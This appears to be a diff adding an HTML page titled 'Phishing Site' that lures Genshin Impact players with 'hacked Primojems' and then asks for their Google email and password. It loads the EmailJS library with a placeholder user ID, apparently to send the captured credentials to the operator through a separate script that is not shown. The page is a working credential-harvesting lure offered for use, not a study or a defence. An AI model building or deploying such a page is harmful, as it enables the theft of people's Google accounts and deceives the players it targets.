@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Site</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <h1>Press Next to Get Hacked Primojems in Genshin Impact Game</h1>
+    <button onclick="nextPage()">Next</button>
+
+    <div id="form-container" style="display:none;">
+        <h2>Enter Your Google Account Information</h2>
+        <form id="phishing-form">
+            <input type="email" id="email" name="email" placeholder="Email" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit">Next</button>
+        </form>
+    </div>
+
+    <div id="hacked-container" style="display:none;">
+        <h1>Hacked Primojems</h1>
+    </div>
+
+    <script src="script.js"></script>
+    <script type="text/javascript" src="https://cdn.emailjs.com/sdk/2.6.4/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("YOUR_USER_ID");
+        })();
+    </script>
+    <script type="text/javascript" src="script.js"></script>
+</body>
+</html>
